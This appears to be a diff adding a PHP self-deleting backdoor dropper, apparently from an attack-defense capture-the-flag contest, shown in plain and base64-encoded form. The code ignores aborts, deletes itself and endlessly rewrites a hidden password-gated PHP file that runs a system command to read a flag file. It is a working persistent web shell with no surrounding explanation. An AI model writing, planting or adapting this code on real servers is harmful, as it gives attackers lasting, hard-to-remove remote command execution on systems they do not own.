@@ -1,0 +1,3 @@
+ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = "--0a".md5(rand(1,3))."[a].php";$code = '<?php if(md5($_GET["pass"])=="76a2173be6393254e72ffa4d6df1030a"){system("cat /flag");} ?>';while (1){file_put_contents($file,$code);usleep(10);}
+
+aWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7c2V0X3RpbWVfbGltaXQoMCk7dW5saW5rKF9fRklMRV9fKTskZmlsZSA9ICItLTBhIi5tZDUocmFuZCgxLDMpKS4iW2FdLnBocCI7JGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNzZhMjE3M2JlNjM5MzI1NGU3MmZmYTRkNmRmMTAzMGEiKXtzeXN0ZW0oImNhdCAvZmxhZyIpO30gPz4nO3doaWxlICgxKXtmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7dXNsZWVwKDEwKTt9
